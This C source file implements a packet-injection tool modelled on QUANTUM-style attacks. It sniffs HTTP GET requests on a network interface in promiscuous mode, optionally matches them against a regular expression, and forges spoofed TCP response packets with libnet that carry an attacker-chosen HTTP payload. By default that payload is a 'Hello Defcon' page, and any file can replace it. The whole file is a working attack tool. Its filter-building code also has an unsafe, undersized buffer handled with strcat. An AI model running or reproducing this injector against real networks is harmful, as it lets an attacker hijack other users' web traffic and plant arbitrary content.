/* 
 * File:   quantuminject.c
 * Author: Seyyed Ahmad Javadi
 *
 * Created on April 23, 2015, 9:39 AM
 */

#include <stdio.h>
#include <stdlib.h>

/*
 We include the header file for the libnet library directly from its source code!
 We test the program in Mac OS and Ubuntu without any problem!! 
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>
#include "./include/libnet.h"
#include  <fcntl.h>
#include <pcre.h>


#define BufSize 1400 

//This is the function that is called in the main.
//It does setup packet capture
void capture_inject(char * interface, char * expression);

//This function detects the get requests
void http_get_sniffer(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

//This fuction injects a spoofed packet
int inject_packet( struct  ether_header * eth_header,  struct ip *ip_header, struct tcphdr *tcp_header,
char * payload, u_short payload_size, uint8_t tcpflags);

void print_payload(const u_char *payload, int len);


//We define these variables as  global because we use them in different  functions 
char * injected_payload;
int injected_payload_size;

char * interface= NULL;
char * regexp;
pcre *regexpCompiled;

int main(int argc, char** argv) {
    int iflag = 0;
    int rflag = 0;
    int dflag = 0;
    
    char * expression= NULL;
    char * datafile;
    int c;
    
    
    const char *pcreErrorBuf;
    int pcreErrorOffset;
    
    while ((c = getopt (argc, argv, "i:r:d:")) != -1)
    switch (c)
      {
      case 'i':
        iflag = 1;
	interface =  optarg;
        break;
      case 'r':
        rflag = 1;
	regexp =  optarg;
	break;
      case 'd':
        dflag = 1;
	datafile =  optarg;
        break;
      default:
	printf("Error!!! Unknown Parameters!!!\n");
        return 0;
      }

    if (argv[optind] != NULL)
	expression = argv[optind];
    
    printf ("iflag = %d, interface = %s, rflag = %d, regexp = %s\n",iflag, interface, rflag, regexp);
    printf ("dflag = %d, datafile = %s, expression = %s\n", dflag, datafile, expression);
    
      //print_payload(payload, payload_size);
  
  
   if(datafile != NULL)
   {    
        injected_payload = malloc(BufSize);
        if(injected_payload  == NULL)
        {
            printf("Error in malloc \n");
            return -1;
        }    
        int BytesRead =0 ;
        int c = 0;
        
        int infile;
        infile =open(datafile,O_RDONLY);
        if(infile < 0)
        {
            printf("Error in opening the file\n");
            return -1;
        }    
        do
        {
            c= read(infile, injected_payload + BytesRead, BufSize - BytesRead);
            if(c == -1)
            {
                printf("Error in reading from the file\n");
                return -1;
            }    
            BytesRead +=c;
        } while(BytesRead < BufSize && c !=0 );
        
        injected_payload_size= BytesRead;
   }    
   else
   {
        //Set the payload for the default packet injection
        //It is similar to the content of greet_html
        injected_payload =
        "HTTP/1.1 200 OK\n"
        "Connection: close\n"
        "Content-Type: text/html\n"
        "\n"        
        "<html><head><title>HELLO DEFCON!</title>\n"
        "</head><body>\n"
        "<blink><font size=+5 color=red>\n"
        "Hello Defcon! Your wireless network is delicious!\n"
        "</font>\n"
        "</blink>\n"
        "<p>\n";
        injected_payload_size = strlen(injected_payload);
        
   } 
   
    
    if (regexp != NULL)
    {    
        regexpCompiled = pcre_compile(regexp, PCRE_MULTILINE|PCRE_DOTALL, &pcreErrorBuf, &pcreErrorOffset, NULL);
        if(regexpCompiled == NULL)
        {
            printf("ERROR: Could not compile '%s': %s\n", regexp, pcreErrorBuf);
            return -1;
        } 

       
    }

    capture_inject(interface, expression);
}

//This function setups required things to the interface 

void capture_inject(char * interface,char * expression)
{
    char errorbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct bpf_program fp; // hold compiled filter
    bpf_u_int32 netmask; //netmask of the device
    bpf_u_int32 ip; //ip of the device 
   
    if(interface == NULL)
    {
	//slecet a device to listen into
	interface = pcap_lookupdev(errorbuf);
	if (interface == NULL) {
		printf("Default device is not found\n");
                return;
        }
    }
  
    printf("interface: %s\n",interface);
    //Ask pcap for the network address and mask of the device	
    if (pcap_lookupnet(interface, &ip, &netmask, errorbuf) == -1) {
	printf("Netmask error for device %s: %s\n",interface, errorbuf);
	return;
    }
    //Opening the device in promiscuous mode!!
    handle = pcap_open_live(interface, BUFSIZ , 1 , 1, errorbuf);
    if (handle == NULL) {
	printf("Error in opening device %s: %s\n", interface, errorbuf);
	return;
    }
    
    //Preparing the filter for http get request 
    //Strcat to the filter the given filter by the user!  
    
    char http_get_filter[] = "tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420";
    char * filter = NULL ;
     
    if(expression != NULL)
    {
        filter =  (char *) malloc(strlen(http_get_filter) + strlen(expression));
        strcat(filter, expression);
        strcat(filter, " and ");
        strcat(filter, http_get_filter);
        
    }
    else
    {
       filter =  http_get_filter;
    }
    
    printf("final filter: %s \n", filter);

    
    if (pcap_compile(handle, &fp, filter, 0, ip) == -1)
    {
                printf("Parse error for the http request filter \n" );
    }

    if (pcap_setfilter(handle, &fp) == -1) {
                printf("Setting error for http request filter\n");
    }
    
    
    pcap_loop(handle, -1 , http_get_sniffer, NULL);
    
    pcap_freecode(&fp);
    pcap_close(handle);
  
}

//Parse a get request and call inject_packet if it is needed

void http_get_sniffer(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  unsigned char *payload;
  int payload_size;
  struct  ether_header * eth_header;
  struct ip *ip_header;
  struct tcphdr *tcp_header;     
  
  bpf_u_int32 net;   
  u_char * packet_ptr; 
  int ip_header_size ;
  int tcp_header_size;
  int packet_length;
  
  int pcreExecRet;
  int subStrVec[30];
  
  /*As far as the strcuture of tcp header is considered,
    mask is used to read the data offset field in the TCP header correctly!!
    Here is the related section in TCP header structure definition:
    
    #if BYTE_ORDER == LITTLE_ENDIAN 
	u_char	th_x2:4,	 (unused) 
		th_off:4;        data offset 
    #endif
    #if BYTE_ORDER == BIG_ENDIAN 
	u_char	th_off:4,	
		th_x2:4;		 (unused) 
 */

  char mask;
  if(BYTE_ORDER == LITTLE_ENDIAN ) //most of the time 
	mask = 0x0f;
  else
	mask = 0xf0;
  
  
  packet_ptr = (u_char *)packet; 
  
  eth_header= (struct  ether_header *)packet_ptr;
  packet_ptr += sizeof(struct  ether_header); 
  
  ip_header = (struct ip *)packet_ptr;
  packet_length = ntohs(ip_header->ip_len);
  ip_header_size = (ip_header->ip_hl & mask)*4;
 
  /* Jump to the begging of the transport layer protocol! 
   filed ip_p in the ip header specifies the upper layer protocol!
   According the following website, the protocol number for TCP is 6 !!
   http://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
  */
  packet_ptr += ip_header_size;
  if(ip_header->ip_p == 6)
  {
        tcp_header = (struct tcphdr *) (packet_ptr);
        tcp_header_size= (int) (tcp_header->th_off & mask) *4; 
	payload = (u_char *)(packet_ptr+ tcp_header_size);
        payload_size = packet_length - (ip_header_size + tcp_header_size);
  }
  else
  {
      return;
  }
  
  //printf("payload size: %d\n", injected_payload_size);  
  if(regexp !=  NULL)
  {
        //Checking that packets includes the given regular expression or not
      
        pcreExecRet = pcre_exec(regexpCompiled,
                            NULL,
                            (const char*)payload, 
                            payload_size,  // length of string
                            0,                      // Start looking at this point
                            0,                      // OPTIONS
                            subStrVec,
                            30);
         if(pcreExecRet > 0) {
             inject_packet(eth_header,  ip_header, tcp_header, injected_payload, injected_payload_size, TH_PUSH | TH_ACK);
             return;
         }
       
  }
  
  else 
  {
      inject_packet(eth_header,  ip_header, tcp_header, injected_payload, injected_payload_size, TH_PUSH | TH_ACK);
      return;
  }    
    

}


//Spoof a raw packet and send it to the wire!
//Here, we use libnet library! 

int inject_packet( struct  ether_header * eth_header,  struct ip *ip_header, struct tcphdr *tcp_header, 
        char * payload, u_short payload_size, uint8_t tcpflags)
{
    int c;
    libnet_ptag_t tag;
    libnet_t *l;
    char errorbuf[LIBNET_ERRBUF_SIZE];
     /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(LIBNET_LINK,interface,errorbuf);    
    
    if(l == NULL)
    {
        printf("libnet_init() failed: %s \n", errorbuf);
    }
    
    
     u_int ack = ntohl(tcp_header->th_seq) + 
    ( ntohs(ip_header->ip_len) - ip_header->ip_hl * 4 - tcp_header->th_off * 4 );
     
    //Bulding TCP header
     
     tag = libnet_build_tcp(
        ntohs(tcp_header->th_dport),                 /* source port */
        ntohs(tcp_header->th_sport),                 /* destination port */
        ntohl(tcp_header->th_ack),                   /* sequence number */
        ack,                                         /* acknowledgement num */
        tcpflags,                                    /* control flags */
        0xffff,                                      /* window size */
        0,                                           /* checksum */
        10,                                          /* urgent pointer */
        /*LIBNET_TCP_H +*/ 20 + payload_size,        /* TCP packet size */
	(uint8_t*)payload,                           /* payload */
        payload_size,                                /* payload size */
        l,                                           /* libnet handle */
        0);                                          /* libnet id */
    if (tag == -1)
    {
        printf("Can't build TCP header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit (EXIT_FAILURE);
    }
      
    //Bulding IP header
     
    tag = libnet_build_ipv4(
        /*LIBNET_IPV4_H + LIBNET_TCP_H + 20*/ 40 + payload_size,/* length */
      	0,                                          /* TOS */
        4000,                                       /* IP ID */
        0,                                          /* IP Frag */
        48,                                         /* TTL */
        IPPROTO_TCP,                                /* protocol */
        0,                                          /* checksum */
        ip_header->ip_dst.s_addr,                   /* source IP */
        ip_header->ip_src.s_addr,                   /* destination IP */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);                                         /* libnet id */
    if (tag == -1)
    {
        printf("Can't build IP header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit (EXIT_FAILURE);
    }
     
    //Building Ethernet Header
    
    tag = libnet_build_ethernet(
        eth_header->ether_shost,                                   /* ethernet destination */
        eth_header->ether_dhost,                                   /* ethernet source */
        //enet_dst,
        //enet_src,
        ETHERTYPE_IP,                               /* protocol type */
        NULL,                                       /* payload */
        0,                                          /* payload size */
        l,                                          /* libnet handle */
        0);                                         /* libnet id */
    if (tag == -1)
    {
        printf("Can't build ethernet header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit (EXIT_FAILURE);
    }
     
     
    //Write it to the wire.
     
    c = libnet_write(l);
    if (c == -1)
    {
        printf("Write error: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        exit (EXIT_FAILURE);
   }
   else
   {
       printf("Wrote %d byte TCP packet; check the wire.\n", c);
   }
    
   libnet_destroy(l); 
   return 1; 
    
}

void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;


	printf("%05d   ", offset);
	
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		if (i == 7)
			printf(" ");
	}
	if (len < 8)
		printf(" ");
	
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");
	

	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

return;
}

void print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;		
	int line_len;
	int offset = 0;					
	const u_char *ch = payload;

	if (len <= 0)
		return;

	
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	for ( ;; ) {
		line_len = line_width % len_rem;
		print_hex_ascii_line(ch, line_len, offset);
		len_rem = len_rem - line_len;
		ch = ch + line_len;
		offset = offset + line_width;
		if (len_rem <= line_width) {
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

return;
}
